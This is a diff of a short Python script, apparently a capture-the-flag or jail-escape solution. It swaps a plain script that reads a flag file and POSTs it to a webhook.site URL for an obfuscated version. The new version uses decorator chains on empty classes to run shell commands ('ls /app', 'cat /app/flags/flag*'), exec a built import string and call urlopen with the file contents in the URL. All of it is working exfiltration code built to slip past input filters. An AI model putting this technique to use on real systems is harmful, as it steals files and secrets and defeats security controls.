@@ -1,16 +1,34 @@
-import urllib.request
-import os
-import json
+from os import popen
 
-flag = os.popen('cat /app/flags/flag_7fc489cb-4e06-4cc8-9404-f856816c2033.txt').read().strip()
-url = 'https://webhook.site/4942a284-d09e-417c-9039-d335aaf9af4b'
-data = json.dumps({'flag': flag}).encode('utf-8')
-req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}, method='POST')
+cmd = lambda a: "ls /app"
+func1 = lambda f: [x[:-1] for x in f][2][-3]
 
-try:
-    response = urllib.request.urlopen(req)
-    content = response.read()
-    print(f"success: {content.decode('utf-8')}")
-    
-except urllib.error.URLError as e:
-    print(f"error: {e}")
+@func1
+@popen
+@cmd
+class dots:pass
+
+dot = dots
+importurlib = "from urllib" + dot + "request import urlopen"
+importlib = lambda f: importurlib
+
+@exec
+@importlib
+class importlibf:pass
+
+url = "https://webhook" + dot + "site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="
+
+cmd2 = lambda a: "cat /app/flags/flag*"
+func2 = lambda f: [x[:-1] for x in f][0]
+
+@func2
+@popen
+@cmd2
+class flag:pass
+
+flagurl = url + flag
+urls = lambda f: flagurl
+
+@urlopen
+@urls
+class requestf:pass
